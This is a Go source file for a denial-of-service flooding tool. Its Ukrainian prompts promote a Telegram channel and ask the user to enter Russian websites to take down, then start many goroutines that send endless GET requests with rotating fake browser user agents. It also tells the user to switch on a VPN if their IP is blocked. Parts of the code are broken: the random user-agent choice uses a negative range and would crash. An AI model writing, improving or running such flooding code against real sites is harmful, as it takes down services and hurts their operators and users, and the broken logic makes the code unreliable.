package main

import (
	"net/http"
	"bufio"
	"os"
	"time"
	"fmt"
	"math/rand"
	"context"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
		"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	}
)

func main() {
	fmt.Println("Наш телеграм канал - @ddosRussians\n\nВітаю! Які сайти будемо класти? Вписуй по одному лінку та натискай Enter\n")
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		url := scanner.Text()
		fmt.Println("Починаємо пиздити русню. Русскій сайт "+url+" іді нахуй.\nПоки йде атака на цей сайт, вписуй наступний лінк, або впиши цей самий, щоб атка була сильніше\nАле багато потоків на 1 сайт не треба робити, бо він заблокує твій IP\n")
		for i := 0; i < 15; i++ {
			go startFlood(url)
		}
	}
}

func startFlood(url string) {
	min := 99
	max := len(userAgents)
	num := rand.Intn(max - min) + min
	userAgent := userAgents[num]
	for {
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Println("Оце так новина, цей сайт вже лежить, або твій айпі у блоці, спробуй ввімкнути впн та повторити.")
			return
		}
		req.Header.Set("user-agent", userAgent)
	    req.Header.Add("Connection", "keep-alive")
	    req.Header.Add("Cache-Control", "no-cache")

		ctx, _ := context.WithTimeout(req.Context(), 10*time.Second)

		req = req.WithContext(ctx)

		client := http.DefaultClient
		for i := 0; i < 300; i++ {
			client.Do(req)
		}
	}
}
